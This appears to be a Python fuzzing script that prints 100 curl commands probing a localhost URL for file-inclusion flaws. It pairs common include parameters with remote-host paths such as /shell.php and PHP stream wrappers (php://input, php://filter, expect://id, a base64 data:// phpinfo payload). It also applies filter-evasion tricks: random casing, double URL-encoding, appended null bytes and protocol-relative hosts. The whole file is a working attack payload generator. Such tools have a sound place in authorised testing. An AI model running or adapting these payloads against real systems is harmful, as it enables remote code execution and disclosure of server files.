import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "file", "page", "include", "template",
    "load", "path", "view", "doc",
    "module", "content", "resource"
]

REMOTE_HOSTS = [
    "http://example.com",
    "https://abc.com",
    "ftp://files.local",
]

WRAPPERS = [
    "php://input",
    "php://filter/resource=index.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "expect://id",
    "phar://archive.zip",
]

PATHS = [
    "/shell.php",
    "/test.txt",
    "/config.php",
    "/admin.php",
    "/backup.zip"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.5:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def maybe_null_byte(s):
    if random.random() > 0.7:
        s += "%00"
    return s

def maybe_protocol_relative(host):
    if random.random() > 0.5:
        return host.replace("http://", "//")
    return host

def generate_payload():
    if random.random() > 0.5:
        host = random.choice(REMOTE_HOSTS)
        host = maybe_protocol_relative(host)
        path = random.choice(PATHS)
        payload = host + path
    else:
        payload = random.choice(WRAPPERS)

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_null_byte(payload)
    payload = maybe_encode(payload)

    return payload

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = generate_payload()
    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
